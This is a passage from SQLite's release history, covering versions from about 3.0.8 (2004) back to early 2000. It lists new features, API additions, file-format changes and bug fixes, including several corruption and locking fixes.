PRIMARY KEY Many SQLITE_OMIT_ macros inserts to omit features at compile-time and reduce the library footprint. The REINDEX command was added. The engine no longer consults the main table if it can get all the information it needs from an index. Many nuisance bugs fixed. 2004-10-12 (3.0.8) Add support for DEFERRED, IMMEDIATE, and EXCLUSIVE transactions. Allow new user-defined functions to be created when there are already one or more precompiled SQL statements. Fix portability problems for MinGW/MSYS. Fix a byte alignment problem on 64-bit Sparc machines. Fix the \".import\" command of the shell so that it ignores \\r characters at the end of lines. The \"csv\" mode option in the shell puts strings inside double-quotes. Fix typos in documentation. Convert array constants in the code to have type \"const\". Numerous code optimizations, specially optimizations designed to make the code footprint smaller. 2004-09-18 (3.0.7) The BTree module allocates large buffers using malloc() instead of off of the stack, in order to play better on machines with limited stack space. Fixed naming conflicts so that versions 2.8 and 3.0 can be linked and used together in the same ANSI-C source file. New interface: sqlite3_bind_parameter_index() Add support for wildcard parameters of the form: \"?nnn\" Fix problems found on 64-bit systems. Removed encode.c file (containing unused routines) from the version 3.0 source tree. The sqlite3_trace() callbacks occur before each statement is executed, not when the statement is compiled. Makefile updates and miscellaneous bug fixes. 2004-09-02 (3.0.6 beta) Better detection and handling of corrupt database files. The sqlite3_step() interface returns SQLITE_BUSY if it is unable to commit a change because of a lock Combine the implementations of LIKE and GLOB into a single pattern-matching subroutine. Miscellaneous code size optimizations and bug fixes 2004-08-29 (3.0.5 beta) Support for \":AAA\" style bind parameter names. Added the new sqlite3_bind_parameter_name() interface. Support for TCL variable names embedded in SQL statements in the TCL bindings. The TCL bindings transfer data without necessarily doing a conversion to a string. The database for TEMP tables is not created until it is needed. Add the ability to specify an alternative temporary file directory using the \"sqlite_temp_directory\" global variable. A compile-time option (SQLITE_BUSY_RESERVED_LOCK) causes the busy handler to be called when there is contention for a RESERVED lock. Various bug fixes and optimizations 2004-08-09 (3.0.4 beta) CREATE TABLE and DROP TABLE now work correctly as prepared statements. Fix a bug in VACUUM and UNIQUE indices. Add the \".import\" command to the command-line shell. Fix a bug that could cause index corruption when an attempt to delete rows of a table is blocked by a pending query. Library size optimizations. Other minor bug fixes. 2004-07-22 (2.8.15) This is a maintenance release only. Various minor bugs have been fixed and some portability enhancements are added. 2004-07-22 (3.0.3 beta) The second beta release for SQLite 3.0. Add support for \"PRAGMA page_size\" to adjust the page size of the database. Various bug fixes and documentation updates. 2004-06-30 (3.0.2 beta) The first beta release for SQLite 3.0. 2004-06-22 (3.0.1 alpha) *** Alpha Release - Research And Testing Use Only *** Lots of bug fixes. 2004-06-18 (3.0.0 alpha) *** Alpha Release - Research And Testing Use Only *** Support for internationalization including UTF-8, UTF-16, and user defined collating sequences. New file format that is 25% to 35% smaller for typical use. Improved concurrency. Atomic commits for ATTACHed databases. Remove cruft from the APIs. BLOB support. 64-bit rowids. More information. 2004-06-09 (2.8.14) Fix the min() and max() optimizer so that it works when the FROM clause consists of a subquery. Ignore extra whitespace at the end of of \".\" commands in the shell. Bundle sqlite_encode_binary() and sqlite_decode_binary() with the library. The TEMP_STORE and DEFAULT_TEMP_STORE pragmas now work. Code changes to compile cleanly using OpenWatcom. Fix VDBE stack overflow problems with INSTEAD OF triggers and NULLs in IN operators. Add the global variable sqlite_temp_directory which if set defines the directory in which temporary files are stored. sqlite_interrupt() plays well with VACUUM. Other minor bug fixes. 2004-03-08 (2.8.13) Refactor parts of the code in order to make the code footprint smaller. The code is now also a little bit faster. sqlite_exec() is now implemented as a wrapper around sqlite_compile() and sqlite_step(). The built-in min() and max() functions now honor the difference between NUMERIC and TEXT datatypes. Formerly, min() and max() always assumed their arguments were of type NUMERIC. New HH:MM:SS modifier to the built-in date/time functions. Experimental sqlite_last_statement_changes() API added. Fixed the last_insert_rowid() function so that it works correctly with triggers. Add functions prototypes for the database encryption API. Fix several nuisance bugs. 2004-02-08 (2.8.12) Fix a bug that will might corrupt the rollback journal if a power failure or external program halt occurs in the middle of a COMMIT. The corrupt journal can lead to database corruption when it is rolled back. Reduce the size and increase the speed of various modules, especially the virtual machine. Allow \"<expr> IN <table>\" as a shorthand for \"<expr> IN (SELECT * FROM <table>\". Optimizations to the sqlite_mprintf() routine. Make sure the MIN() and MAX() optimizations work within subqueries. 2004-01-14 (2.8.11) Fix a bug in how the IN operator handles NULLs in subqueries. The bug was introduced by the previous release. 2004-01-14 (2.8.10) Fix a potential database corruption problem on Unix caused by the fact that all POSIX advisory locks are cleared whenever you close() a file. The work around it to embargo all close() calls while locks are outstanding. Performance enhancements on some corner cases of COUNT(*). Make sure the in-memory backend response sanely if malloc() fails. Allow sqlite_exec() to be called from within user-defined SQL functions. Improved accuracy of floating-point conversions using \"long double\". Bug fixes in the experimental date/time functions. 2004-01-06 (2.8.9) Fix a 32-bit integer overflow problem that could result in corrupt indices in a database if large negative numbers (less than -2147483648) were inserted into an indexed numeric column. Fix a locking problem on multi-threaded Linux implementations. Always use \".\" instead of \",\" as the decimal point even if the locale requests \",\". Added UTC to localtime conversions to the experimental date/time functions. Bug fixes to date/time functions. 2003-12-18 (2.8.8) Fix a critical bug introduced into 2.8.0 which could cause database corruption. Fix a problem with 3-way joins that do not use indices The VACUUM command now works with the non-callback API Improvements to the \"PRAGMA integrity_check\" command 2003-12-04 (2.8.7) Added experimental sqlite_bind() and sqlite_reset() APIs. If the name of the database is an empty string, open a new database in a temporary file that is automatically deleted when the database is closed. Performance enhancements in the Lemon-generated parser Experimental date/time functions revised. Disallow temporary indices on permanent tables. Documentation updates and typo fixes Added experimental sqlite_progress_handler() callback API Removed support for the Oracle8 outer join syntax. Allow GLOB and LIKE operators to work as functions. Other minor documentation and makefile changes and bug fixes. 2003-08-22 (2.8.6) Moved the CVS repository to www.sqlite.org Update the NULL-handling documentation. Experimental date/time functions added. Bug fix: correctly evaluate a view of a view without segfaulting. Bug fix: prevent database corruption if you dropped a trigger that had the same name as a table. Bug fix: allow a VACUUM (without segfaulting) on an empty database after setting the EMPTY_RESULT_CALLBACKS pragma. Bug fix: if an integer value will not fit in a 32-bit int, store it in a double instead. Bug fix: Make sure the journal file directory entry is committed to disk before writing the database file. 2003-07-22 (2.8.5) Make LIMIT work on a compound SELECT statement. LIMIT 0 now shows no rows. Use LIMIT -1 to see all rows. Correctly handle comparisons between an INTEGER PRIMARY KEY and a floating point number. Fix several important bugs in the new ATTACH and DETACH commands. Updated the NULL-handling document. Allow NULL arguments in sqlite_compile() and sqlite_step(). Many minor bug fixes 2003-06-29 (2.8.4) Enhanced the \"PRAGMA integrity_check\" command to verify indices. Added authorization hooks for the new ATTACH and DETACH commands. Many documentation updates Many minor bug fixes 2003-06-04 (2.8.3) Fix a problem that will corrupt the indices on a table if you do an INSERT OR REPLACE or an UPDATE OR REPLACE on a table that contains an INTEGER PRIMARY KEY plus one or more indices. Fix a bug in Windows locking code so that locks work correctly when simultaneously accessed by Win95 and WinNT systems. Add the ability for INSERT and UPDATE statements to refer to the \"rowid\" (or \"_rowid_\" or \"oid\") columns. Other important bug fixes 2003-05-17 (2.8.2) Fix a problem that will corrupt the database file if you drop a table from the main database that has a TEMP index. 2003-05-17 (2.8.1) Reactivated the VACUUM command that reclaims unused disk space in a database file. Added the ATTACH and DETACH commands to allow interacting with multiple database files at the same time. Added support for TEMP triggers and indices. Added support for in-memory databases. Removed the experimental sqlite_open_aux_file(). Its function is subsumed in the new ATTACH command. The precedence order for ON CONFLICT clauses was changed so that ON CONFLICT clauses on BEGIN statements have a higher precedence than ON CONFLICT clauses on constraints. Many, many bug fixes and compatibility enhancements. 2003-02-16 (2.8.0) Modified the journal file format to make it more resistant to corruption that can occur after an OS crash or power failure. Added a new C/C++ API that does not use callback for returning data. 2003-01-25 (2.7.6) Performance improvements. The library is now much faster. Added the sqlite_set_authorizer() API. Formal documentation has not been written - see the source code comments for instructions on how to use this function. Fix a bug in the GLOB operator that was preventing it from working with upper-case letters. Various minor bug fixes. 2002-12-28 (2.7.5) Fix an uninitialized variable in pager.c which could (with a probability of about 1 in 4 billion) result in a corrupted database. 2002-12-17 (2.7.4) Database files can now grow to be up to 2^41 bytes. The old limit was 2^31 bytes. The optimizer will now scan tables in the reverse if doing so will satisfy an ORDER BY ... DESC clause. The full pathname of the database file is now remembered even if a relative path is passed into sqlite_open(). This allows the library to continue operating correctly after a chdir(). Speed improvements in the VDBE. Lots of little bug fixes. 2002-10-31 (2.7.3) Various compiler compatibility fixes. Fix a bug in the \"expr IN ()\" operator. Accept column names in parentheses. Fix a problem with string memory management in the VDBE Fix a bug in the \"table_info\" pragma\" Export the sqlite_function_type() API function in the Windows DLL Fix locking behavior under Windows Fix a bug in LEFT OUTER JOIN 2002-09-25 (2.7.2) Prevent journal file overflows on huge transactions. Fix a memory leak that occurred when sqlite_open() failed. Honor the ORDER BY and LIMIT clause of a SELECT even if the result set is used for an INSERT. Do not put write locks on the file used to hold TEMP tables. Added documentation on SELECT DISTINCT and on how SQLite handles NULLs. Fix a problem that was causing poor performance when many thousands of SQL statements were executed by a single sqlite_exec() call. 2002-08-31 (2.7.1) Fix a bug in the ORDER BY logic that was introduced in version 2.7.0 C-style comments are now accepted by the tokenizer. INSERT runs a little faster when the source is a SELECT statement. 2002-08-25 (2.7.0) Make a distinction between numeric and text values when sorting. Text values sort according to memcmp(). Numeric values sort in numeric order. Allow multiple simultaneous readers under Windows by simulating the reader/writers locks that are missing from Win95/98/ME. An error is now returned when trying to start a transaction if another transaction is already active. 2002-08-13 (2.6.3) Add the ability to read both little-endian and big-endian databases. So a database created under SunOS or Mac OS X can be read and written under Linux or Windows and vice versa. Convert to the new website: http://www.sqlite.org/ Allow transactions to span Linux Threads Bug fix in the processing of the ORDER BY clause for GROUP BY queries 2002-07-31 (2.6.2) Text files read by the COPY command can now have line terminators of LF, CRLF, or CR. SQLITE_BUSY is handled correctly if encountered during database initialization. Fix to UPDATE triggers on TEMP tables. Documentation updates. 2002-07-19 (2.6.1) Include a static string in the library that responds to the RCS \"ident\" command and which contains the library version number. Fix an assertion failure that occurred when deleting all rows of a table with the \"count_changes\" pragma turned on. Better error reporting when problems occur during the automatic 2.5.6 to 2.6.0 database format upgrade. 2002-07-18 (2.6.0) Change the format of indices to correct a design flaw the originated with version 2.1.0. *** This is an incompatible file format change *** When version 2.6.0 or later of the library attempts to open a database file created by version 2.5.6 or earlier, it will automatically and irreversibly convert the file format. Make backup copies of older database files before opening them with version 2.6.0 of the library. 2002-07-07 (2.5.6) Fix more problems with rollback. Enhance the test suite to exercise the rollback logic extensively in order to prevent any future problems. 2002-07-06 (2.5.5) Fix a bug which could cause database corruption during a rollback. This bugs was introduced in version 2.4.0 by the freelist optimization of checkin [410]. Fix a bug in aggregate functions for VIEWs. Other minor changes and enhancements. 2002-07-01 (2.5.4) Make the \"AS\" keyword optional again. The datatype of columns now appear in the 4th argument to the callback. Added the sqlite_open_aux_file() API, though it is still mostly undocumented and untested. Added additional test cases and fixed a few bugs that those test cases found. 2002-06-25 (2.5.3) Bug fix: Database corruption can occur due to the optimization that was introduced in version 2.4.0 (check-in [410]). The problem should now be fixed. The use of versions 2.4.0 through 2.5.2 is not recommended. 2002-06-25 (2.5.2) Added the new SQLITE_TEMP_MASTER table which records the schema for temporary tables in the same way that SQLITE_MASTER does for persistent tables. Added an optimization to UNION ALL Fixed a bug in the processing of LEFT OUTER JOIN The LIMIT clause now works on subselects ORDER BY works on subselects There is a new TypeOf() function used to determine if an expression is numeric or text. Autoincrement now works for INSERT from a SELECT. 2002-06-19 (2.5.1) The query optimizer now attempts to implement the ORDER BY clause using an index. Sorting is still used if not suitable index is available. 2002-06-17 (2.5.0) Added support for row triggers. Added SQL-92 compliant handling of NULLs. Add support for the full SQL-92 join syntax and LEFT OUTER JOINs. Double-quoted strings interpreted as column names not text literals. Parse (but do not implement) foreign keys. Performance improvements in the parser, pager, and WHERE clause code generator. Make the LIMIT clause work on subqueries. (ORDER BY still does not work, though.) Added the \"%Q\" expansion to sqlite_*_printf(). Bug fixes too numerous to mention (see the change log). 2002-05-10 (2.4.12) Added logic to detect when the library API routines are called out of sequence. 2002-05-08 (2.4.11) Bug fix: Column names in the result set were not being generated correctly for some (rather complex) VIEWs. This could cause a segfault under certain circumstances. 2002-05-03 (2.4.10) Bug fix: Generate correct column headers when a compound SELECT is used as a subquery. Added the sqlite_encode_binary() and sqlite_decode_binary() functions to the source tree. But they are not yet linked into the library. Documentation updates. Export the sqlite_changes() function from Windows DLLs. Bug fix: Do not attempt the subquery flattening optimization on queries that lack a FROM clause. To do so causes a segfault. 2002-04-22 (2.4.9) Fix a bug that was causing the precompiled binary of SQLITE.EXE to report \"out of memory\" under Windows 98. 2002-04-20 (2.4.8) Make sure VIEWs are created after their corresponding TABLEs in the output of the .dump command in the shell. Speed improvements: Do not do synchronous updates on TEMP tables. Many improvements and enhancements to the shell. Make the GLOB and LIKE operators functions that can be overridden by a programmer. This allows, for example, the LIKE operator to be changed to be case sensitive. 2002-04-12 (2.4.7) Add the ability to put TABLE.* in the column list of a SELECT statement. Permit SELECT statements without a FROM clause. Added the last_insert_rowid() SQL function. Do not count rows where the IGNORE conflict resolution occurs in the row count. Make sure functions expressions in the VALUES clause of an INSERT are correct. Added the sqlite_changes() API function to return the number of row that changed in the most recent operation. 2002-04-02 (2.4.6) Bug fix: Correctly handle terms in the WHERE clause of a join that do not contain a comparison operator. 2002-04-02 (2.4.5) Bug fix: Correctly handle functions that appear in the WHERE clause of a join. When the PRAGMA vdbe_trace=ON is set, correctly print the P3 operand value when it is a pointer to a structure rather than a pointer to a string. When inserting an explicit NULL into an INTEGER PRIMARY KEY, convert the NULL value into a unique key automatically. 2002-03-30 (2.4.4) Allow \"VIEW\" to be a column name Added support for CASE expressions (patch from Dan Kennedy) Added RPMS to the delivery (patches from Doug Henry) Fix typos in the documentation Cut over configuration management to a new CVS repository with its own CVSTrac bug tracking system. 2002-03-23 (2.4.3) Fix a bug in SELECT that occurs when a compound SELECT is used as a subquery in the FROM of a SELECT. The sqlite_get_table() function now returns an error if you give it two or more SELECTs that return different numbers of columns. 2002-03-20 (2.4.2) Bug fix: Fix an assertion failure that occurred when ROWID was a column in a SELECT statement on a view. Bug fix: Fix an uninitialized variable in the VDBE that would could an assert failure. Make the os.h header file more robust in detecting when the compile is for Windows and when it is for Unix. 2002-03-13 (2.4.1) Using an unnamed subquery in a FROM clause would cause a segfault. The parser now insists on seeing a semicolon or the end of input before executing a statement. This avoids an accidental disaster if the WHERE keyword is misspelled in an UPDATE or DELETE statement. 2002-03-11 (2.4.0) Change the name of the sanity_check PRAGMA to integrity_check and make it available in all compiles. SELECT min() or max() of an indexed column with no WHERE or GROUP BY clause is handled as a special case which avoids a complete table scan. Automatically generated ROWIDs are now sequential. Do not allow dot-commands of the command-line shell to occur in the middle of a real SQL command. Modifications to the Lemon parser generator so that the parser tables are 4 times smaller. Added support for user-defined functions implemented in C. Added support for new functions: coalesce(), lower(), upper(), and random() Added support for VIEWs. Added the subquery flattening optimizer. Modified the B-Tree and Pager modules so that disk pages that do not contain real data (free pages) are not journaled and are not written from memory back to the disk when they change. This does not impact database integrity, since the pages contain no real data, but it does make large INSERT operations about 2.5 times faster and large DELETEs about 5 times faster. Made the CACHE_SIZE pragma persistent Added the SYNCHRONOUS pragma Fixed a bug that was causing updates to fail inside of transactions when the database contained a temporary table. 2002-02-19 (2.3.3) Allow identifiers to be quoted in square brackets, for compatibility with MS-Access. Added support for sub-queries in the FROM clause of a SELECT. More efficient implementation of sqliteFileExists() under Windows. (by Joel Luscy) The VALUES clause of an INSERT can now contain expressions, including scalar SELECT clauses. Added support for CREATE TABLE AS SELECT Bug fix: Creating and dropping a table all within a single transaction was not working. 2002-02-14 (2.3.2) Bug fix: There was an incorrect assert() in pager.c. The real code was all correct (as far as is known) so everything should work OK if you compile with -DNDEBUG=1. When asserts are not disabled, there could be a fault. 2002-02-13 (2.3.1) Bug fix: An assertion was failing if \"PRAGMA full_column_names=ON;\" was set and you did a query that used a rowid, like this: \"SELECT rowid, * FROM ...\". 2002-02-03 (2.3.0) Fix a serious bug in the INSERT command which was causing data to go into the wrong columns if the data source was a SELECT and the INSERT clauses specified its columns in some order other than the default. Added the ability to resolve constraint conflicts is ways other than an abort and rollback. See the documentation on the \"ON CONFLICT\" clause for details. Temporary files are now automatically deleted by the operating system when closed. There are no more dangling temporary files on a program crash. (If the OS crashes, fsck will delete the file after reboot under Unix. I do not know what happens under Windows.) NOT NULL constraints are honored. The COPY command puts NULLs in columns whose data is '\\N'. In the COPY command, backslash can now be used to escape a newline. Added the SANITY_CHECK pragma. 2002-01-28 (2.2.5) Important bug fix: the IN operator was not working if either the left-hand or right-hand side was derived from an INTEGER PRIMARY KEY. Do not escape the backslash '\\' character in the output of the sqlite command-line access program. 2002-01-22 (2.2.4) The label to the right of an AS in the column list of a SELECT can now be used as part of an expression in the WHERE, ORDER BY, GROUP BY, and/or HAVING clauses. Fix a bug in the -separator command-line option to the sqlite command. Fix a problem with the sort order when comparing upper-case strings against characters greater than 'Z' but less than 'a'. Report an error if an ORDER BY or GROUP BY expression is constant. 2002-01-16 (2.2.3) Fix warning messages in VC++ 7.0. (Patches from nicolas352001) Make the library thread-safe. (The code is there and appears to work but has not been stressed.) Added the new sqlite_last_insert_rowid() API function. 2002-01-14 (2.2.2) Bug fix: An assertion was failing when a temporary table with an index had the same name as a permanent table created by a separate process. Bug fix: Updates to tables containing an INTEGER PRIMARY KEY and an index could fail. 2002-01-09 (2.2.1) Bug fix: An attempt to delete a single row of a table with a WHERE clause of \"ROWID=x\" when no such rowid exists was causing an error. Bug fix: Passing in a NULL as the 3rd parameter to sqlite_open() would sometimes cause a coredump. Bug fix: DROP TABLE followed by a CREATE TABLE with the same name all within a single transaction was causing a coredump. Makefile updates from A. Rottmann 2001-12-22 (2.2.0) Columns of type INTEGER PRIMARY KEY are actually used as the primary key in underlying B-Tree representation of the table. Several obscure, unrelated bugs were found and fixed while implemented the integer primary key change of the previous bullet. Added the ability to specify \"*\" as part of a larger column list in the result section of a SELECT statement. For example: \"SELECT rowid, * FROM table1;\". Updates to comments and documentation. 2001-12-15 (2.1.7) Fix a bug in CREATE TEMPORARY TABLE which was causing the table to be initially allocated in the main database file instead of in the separate temporary file. This bug could cause the library to suffer an assertion failure and it could cause \"page leaks\" in the main database file. Fix a bug in the b-tree subsystem that could sometimes cause the first row of a table to be repeated during a database scan. 2001-12-14 (2.1.6) Fix the locking mechanism yet again to prevent sqlite_exec() from returning SQLITE_PROTOCOL unnecessarily. This time the bug was a race condition in the locking code. This change affects both POSIX and Windows users. 2001-12-06 (2.1.5) Fix for another problem (unrelated to the one fixed in 2.1.4) that sometimes causes sqlite_exec() to return SQLITE_PROTOCOL unnecessarily. This time the bug was in the POSIX locking code and should not effect Windows users. 2001-12-05 (2.1.4) Sometimes sqlite_exec() would return SQLITE_PROTOCOL when it should have returned SQLITE_BUSY. The fix to the previous bug uncovered a deadlock which was also fixed. Add the ability to put a single .command in the second argument of the sqlite shell Updates to the FAQ 2001-11-24 (2.1.3) Fix the behavior of comparison operators (ex: \"<\", \"==\", etc.) so that they are consistent with the order of entries in an index. Correct handling of integers in SQL expressions that are larger than what can be represented by the machine integer. 2001-11-23 (2.1.2) Changes to support 64-bit architectures. Fix a bug in the locking protocol. Fix a bug that could (rarely) cause the database to become unreadable after a DROP TABLE due to corruption to the SQLITE_MASTER table. Change the code so that version 2.1.1 databases that were rendered unreadable by the above bug can be read by this version of the library even though the SQLITE_MASTER table is (slightly) corrupted. 2001-11-13 (2.1.1) Bug fix: Sometimes arbitrary strings were passed to the callback function when the actual value of a column was NULL. 2001-11-12 (2.1.0) Change the format of data records so that records up to 16MB in size can be stored. Change the format of indices to allow for better query optimization. Implement the \"LIMIT ... OFFSET ...\" clause on SELECT statements. 2001-11-03 (2.0.8) Made selected parameters in API functions const. This should be fully backwards compatible. Documentation updates Simplify the design of the VDBE by restricting the number of sorters and lists to 1. In practice, no more than one sorter and one list was ever used anyhow. 2001-10-22 (2.0.7) Any UTF-8 character or ISO8859 character can be used as part of an identifier. Patches from Christian Werner to improve ODBC compatibility and to fix a bug in the round() function. Plug some memory leaks that use to occur if malloc() failed. We have been and continue to be memory leak free as long as malloc() works. Changes to some test scripts so that they work on Windows in addition to Unix. 2001-10-19 (2.0.6) Added the EMPTY_RESULT_CALLBACKS pragma Support for UTF-8 and ISO8859 characters in column and table names. Bug fix: Compute correct table names with the FULL_COLUMN_NAMES pragma is turned on. 2001-10-15 (2.0.5) Added the COUNT_CHANGES pragma. Changes to the FULL_COLUMN_NAMES pragma to help out the ODBC driver. Bug fix: \"SELECT count(*)\" was returning NULL for empty tables. Now it returns 0. 2001-10-13 (2.0.4) Bug fix: an obscure and relatively harmless bug was causing one of the tests to fail when gcc optimizations are turned on. This release fixes the problem. 2001-10-13 (2.0.3) Bug fix: the sqlite_busy_timeout() function was delaying 1000 times too long before failing. Bug fix: an assertion was failing if the disk holding the database file became full or stopped accepting writes for some other reason. New tests were added to detect similar problems in the future. Added new operators: & (bitwise-and) | (bitwise-or), ~ (ones-complement), << (shift left), >> (shift right). Added new functions: round() and abs(). 2001-10-09 (2.0.2) Fix two bugs in the locking protocol. (One was masking the other.) Removed some unused \"#include \" that were causing problems for VC++. Fixed sqlite.h so that it is usable from C++ Added the FULL_COLUMN_NAMES pragma. When set to \"ON\", the names of columns are reported back as TABLE.COLUMN instead of just COLUMN. Added the TABLE_INFO() and INDEX_INFO() pragmas to help support the ODBC interface. Added support for TEMPORARY tables and indices. 2001-10-02 (2.0.1) Remove some C++ style comments from btree.c so that it will compile using compilers other than gcc. The \".dump\" output from the shell does not work if there are embedded newlines anywhere in the data. This is an old bug that was carried forward from version 1.0. To fix it, the \".dump\" output no longer uses the COPY command. It instead generates INSERT statements. Extend the expression syntax to support \"expr NOT NULL\" (with a space between the \"NOT\" and the \"NULL\") in addition to \"expr NOTNULL\" (with no space). 2001-09-28 (2.0.0) Automatically build binaries for Linux and Windows and put them on the website. 2001-09-28 (2.0-alpha-4) Incorporate makefile patches form A. Rottmann to use LIBTOOL 2001-09-27 (2.0-alpha-3) SQLite now honors the UNIQUE keyword in CREATE UNIQUE INDEX. Primary keys are required to be unique. File format changed back to what it was for alpha-1 Fixes to the rollback and locking behavior 2001-09-20 (2.0-alpha-2) Initial release of version 2.0. The idea of renaming the library to \"SQLus\" was abandoned in favor of keeping the \"SQLite\" name and bumping the major version number. The pager and btree subsystems added back. They are now the only available backend. The Dbbe abstraction and the GDBM and memory drivers were removed. Copyright on all code was disclaimed. The library is now in the public domain. 2001-07-23 (1.0.32) Pager and btree subsystems removed. These will be used in a follow-on SQL server library named \"SQLus\". Add the ability to use quoted strings as table and column names in expressions. 2001-04-15 (1.0.31) Pager subsystem added but not yet used. More robust handling of out-of-memory errors. New tests added to the test suite. 2001-04-06 (1.0.30) Remove the sqlite_encoding TCL variable that was introduced in the previous version. Add options -encoding and -tcl-uses-utf to the sqlite TCL command. Add tests to make sure that tclsqlite was compiled using Tcl header files and libraries that match. 2001-04-05 (1.0.29) The library now assumes data is stored as UTF-8 if the --enable-utf8 option is given to configure. The default behavior is to assume iso8859-x, as it has always done. This only makes a difference for LIKE and GLOB operators and the LENGTH and SUBSTR functions. If the library is not configured for UTF-8 and the Tcl library is one of the newer ones that uses UTF-8 internally, then a conversion from UTF-8 to iso8859 and back again is done inside the TCL interface. 2001-04-04 (1.0.28) Added limited support for transactions. At this point, transactions will do table locking on the GDBM backend. There is no support (yet) for rollback or atomic commit. Added special column names ROWID, OID, and _ROWID_ that refer to the unique random integer key associated with every row of every table. Additional tests added to the regression suite to cover the new ROWID feature and the TCL interface bugs mentioned below. Changes to the Lemon parser generator to help it work better when compiled using MSVC. Bug fixes in the TCL interface identified by Oleg Oleinick. 2001-03-20 (1.0.27) When doing DELETE and UPDATE, the library used to write the record numbers of records to be deleted or updated into a temporary file. This is changed so that the record numbers are held in memory. The DELETE command without a WHILE clause just removes the database files from the disk, rather than going through and deleting record by record. 2001-03-20 (1.0.26) A serious bug fixed on Windows. Windows users should upgrade. No impact to Unix. 2001-03-15 (1.0.25) Modify the test scripts to identify tests that depend on system load and processor speed and to warn the user that a failure of one of those (rare) tests does not necessarily mean the library is malfunctioning. No changes to code. 2001-03-14 (1.0.24) Fix a bug which was causing the UPDATE command to fail on systems where \"malloc(0)\" returns NULL. The problem does not appear on Windows, Linux, or HPUX but does cause the library to fail on QNX. 2001-02-20 (1.0.23) An unrelated (and minor) bug from Mark Muranwski fixed. The algorithm for figuring out where to put temporary files for a \"memory:\" database was not working quite right. 2001-02-19 (1.0.22) The previous fix was not quite right. This one seems to work better. 2001-02-19 (1.0.21) The UPDATE statement was not working when the WHERE clause contained some terms that could be satisfied using indices and other terms that could not. Fixed. 2001-02-11 (1.0.20) Merge development changes into the main trunk. Future work toward using a BTree file structure will use a separate CVS source tree. This CVS tree will continue to support the GDBM version of SQLite only. 2001-02-06 (1.0.19) Fix a strange (but valid) C declaration that was causing problems for QNX. No logical changes. 2001-01-04 (1.0.18) Print the offending SQL statement when an error occurs. Do not require commas between constraints in CREATE TABLE statements. Added the \"-echo\" option to the shell. Changes to comments. 2000-12-10 (1.0.17) Rewrote sqlite_complete() to make it faster. Minor tweaks to other code to make it run a little faster. Added new tests for sqlite_complete() and for memory leaks. 2000-11-28 (1.0.16) Documentation updates. Mostly fixing of typos and spelling errors. 2000-10-23 (1.0.15) Documentation updates Some sanity checking code was removed from the inner loop of vdbe.c to help the library to run a little faster. The code is only removed if you compile with -DNDEBUG. 2000-10-19 (1.0.14) Added a \"memory:\" backend driver that stores its database in an in-memory hash table. 2000-10-19 (1.0.13) Break out the GDBM driver into a separate file in anticipation to added new drivers. Allow the name of a database to be prefixed by the driver type. For now, the only driver type is \"gdbm:\". 2000-10-17 (1.0.12) Fixed an off-by-one error that was causing a coredump in the '%q' format directive of the new sqlite_..._printf() routines. Added the sqlite_interrupt() interface. In the shell, sqlite_interrupt() is invoked when the user presses Control-C Fixed some instances where sqlite_exec() was returning the wrong error code. 2000-10-11 (1.0.10) Added notes on how to compile for Windows95/98. Removed a few variables that were not being used. Etc. 2000-10-09 (1.0.9) Added the sqlite_..._printf() interface routines. Modified the sqlite shell program to use the new interface routines. Modified the sqlite shell program to print the schema for the built-in SQLITE_MASTER table, if explicitly requested. 2000-09-30 (1.0.8) Begin writing documentation on the TCL interface. 2000-09-29 (Not Released) Added the sqlite_get_table() API Updated the documentation for due to the above change. Modified the sqlite shell to make use of the new sqlite_get_table() API in order to print a list of tables in multiple columns, similar to the way \"ls\" prints filenames. Modified the sqlite shell to print a semicolon at the end of each CREATE statement in the output of the \".schema\" command. 2000-09-21 (Not Released) Change the tclsqlite \"eval\" method to return a list of results if no callback script is specified. Change tclsqlite.c to use the Tcl_Obj interface Add tclsqlite.c to the libsqlite.a library 2000-09-14 (1.0.5) Changed the print format for floating point values from \"%g\" to \"%.15g\". Changed the comparison function so that numbers in exponential notation (ex: 1.234e+05) sort in numerical order. 2000-08-28 (1.0.4) Added functions length() and substr(). Fix a bug in the sqlite shell program that was causing a coredump when the output mode was \"column\" and the first row of data contained a NULL. 2000-08-22 (1.0.3) In the sqlite shell, print the \"Database opened READ ONLY\" message to stderr instead of stdout. In the sqlite shell, now print the version number on initial startup. Add the sqlite_version[] string constant to the library Makefile updates Bug fix: incorrect VDBE code was being generated for the following circumstance: a query on an indexed table containing a WHERE clause with an IN operator that had a subquery on its right-hand side. 2000-08-18 (1.0.1) Fix a bug in the configure script. Minor revisions to the website. 2000-08-17 (1.0) Change the sqlite program so that it can read databases for which it lacks write permission. (It used to refuse all access if it could not write.) 2000-08-09 Treat carriage returns as white space. 2000-08-08 Added pattern matching to the \".table\" command in the \"sqlite\" command shell. 2000-08-04 Documentation updates Added \"busy\" and \"timeout\" methods to the Tcl interface 2000-08-03 File format version number was being stored in sqlite_master.tcl multiple times. This was harmless, but unnecessary. It is now fixed. 2000-08-02 The file format for indices was changed slightly in order to work around an inefficiency that can sometimes come up with GDBM when there are large indices having many entries with the same key. ** Incompatible Change ** 2000-08-01 The parser's stack was overflowing on a very long UPDATE statement. This is now fixed. 2000-07-31 Finish the VDBE tutorial. Added documentation on compiling to WinNT. Fix a configuration program for WinNT. Fix a configuration problem for HPUX. 2000-07-29 Better labels on column names of the result. 2000-07-28 Added the sqlite_busy_handler() and sqlite_busy_timeout() interface. 2000-06-23 Begin writing the VDBE tutorial. 2000-06-21 Clean up comments and variable names. Changes to documentation. No functional changes to the code. 2000-06-19 Column names in UPDATE statements were case sensitive. This mistake has now been fixed. 2000-06-18 Added the concatenate string operator (||) 2000-06-12 Added the fcnt() function to the SQL interpreter. The fcnt() function returns the number of database \"Fetch\" operations that have occurred. This function is designed for use in test scripts to verify that queries are efficient and appropriately optimized. Fcnt() has no other useful purpose, as far as I know. Added a bunch more tests that take advantage of the new fcnt() function. The new tests did not uncover any new problems. 2000-06-08 Added lots of new test cases Fix a few bugs discovered while adding test cases Begin adding lots of new documentation 2000-06-06 Added compound select operators: UNION, UNION ALL, INTERSECT, and EXCEPT Added support for using (SELECT ...) within expressions Added support for IN and BETWEEN operators Added support for GROUP BY and HAVING NULL values are now reported to the callback as a NULL pointer rather than an empty string. 2000-06-03 Added support for default values on columns of a table. Improved test coverage. Fixed a few obscure bugs found by the improved tests. 2000-06-02 All database files to be modified by an UPDATE, INSERT or DELETE are now locked before any changes are made to any files. This makes it safe (I think) to access the same database simultaneously from multiple processes. The code appears stable so we are now calling it \"beta\". 2000-06-01 Better support for file locking so that two or more processes (or threads) can access the same database simultaneously. More work needed in this area, though. 2000-05-31 Added support for aggregate functions (Ex: COUNT(*), MIN(...)) to the SELECT statement. Added support for SELECT DISTINCT ... 2000-05-30 Added 